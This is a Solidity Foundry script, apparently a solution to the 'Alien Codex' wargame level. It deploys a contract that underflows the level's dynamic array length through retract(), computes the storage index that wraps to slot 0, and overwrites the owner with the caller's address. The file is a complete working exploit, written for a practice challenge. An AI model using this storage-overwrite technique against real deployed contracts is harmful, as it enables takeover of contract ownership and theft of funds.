// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console2.sol";

interface IAlienCodex {
    function revise(uint i, bytes32 _content) external;
    function makeContact() external;
    function retract() external;
}

contract AlienCodex {
    address level19;

    constructor(address _levelInstance) {
        level19 = _levelInstance;
    }

    function trigger() external {
        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));
        IAlienCodex(level19).makeContact();
        IAlienCodex(level19).retract();
        IAlienCodex(level19).revise(index, myAddress);
    }
}

contract AlienScript is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AlienCodex alien = new AlienCodex(
            address(0x084F0e612F2e3B799C4cDE975984D3D7775FB11C)
        );
        alien.trigger();
        vm.stopBroadcast();
    }
}
